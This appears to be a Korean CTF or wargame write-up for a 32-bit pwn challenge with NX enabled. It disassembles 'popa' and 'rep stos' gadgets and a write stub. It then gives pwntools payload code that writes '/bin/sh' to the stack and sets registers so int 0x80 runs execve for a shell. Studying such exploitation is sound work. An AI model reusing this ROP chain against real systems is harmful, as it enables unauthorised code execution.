## 함수 분석 / 취약점 발견
* checksec으로 NX bit가 걸려있어 기존의 LOB처럼 stack에서 shellcode를 실행시키지는 못한다.
```
gdb-peda$ info func
All defined functions:

Non-debugging symbols:
0x080480d8  gadget1
0x080480db  gadget2
0x080480dd  _start
0x080480f7  write
```
### gadget1
```
   0x080480d8 <+0>:	rep stos BYTE PTR es:[edi],al
   0x080480da <+2>:	ret 
```
* gadget1은 ecx만큼 edi에 al의 값을 넣는다.

### gadget2
```
   0x080480db <+0>:	popa
   0x080480dc <+1>:	ret
```
* register( EDI ESI EBP ESP EBX ECX EDX EAX)들을 pop 하는 gadget이다.
write
```
   0x080480f7 <+0>:	mov    eax,0x4
   0x080480fc <+5>:	mov    ebx,DWORD PTR [esp+0x4]
   0x08048100 <+9>:	mov    ecx,DWORD PTR [esp+0x8]
   0x08048104 <+13>:	mov    edx,DWORD PTR [esp+0xc]
   0x08048108 <+17>:	int    0x80
   0x0804810a <+19>:	ret 
```
* int 0x80이 있어 register의 값을 조정하고 "/bin/sh\x00"을 입력할 수 있다면 `execve("/bin/sh", NULL, NULL)`을 실행할 수 있다.
## 구현
* pwntool 사용
1. /bin/sh에 해당하는 ascii 값을 입력시켜준다. /bin/sh 문자열은 stack에 저장하였다.
```python
payload = 0
for index, ascnum in enumerate([47, 98, 105, 110, 47, 115, 104]):
    print(index, ascnum)
    if payload == 0:
        payload = gadget2_addr + p32(0xff85ca58 + index) + p32(1) * 6 + p32(ascnum) + gadget1_addr
    else:
        payload += gadget2_addr + p32(0xff85ca58 + index) + p32(1) * 6 + p32(ascnum) + gadget1_addr
```
2. 이후 gadget2로 pop을 하기전 stack을 잘 구성해서 ebx는 /bin/sh가 있는 주소로, ecx와 edx는 0으로 해주고, eax는 11로 설정해준다.
* int 0x80시 execve를 호출한다.
```
payload += gadget2_addr + p32(0) * 4 + stack_addr + p32(0) * 2 + p32(11) + int80_addr
```
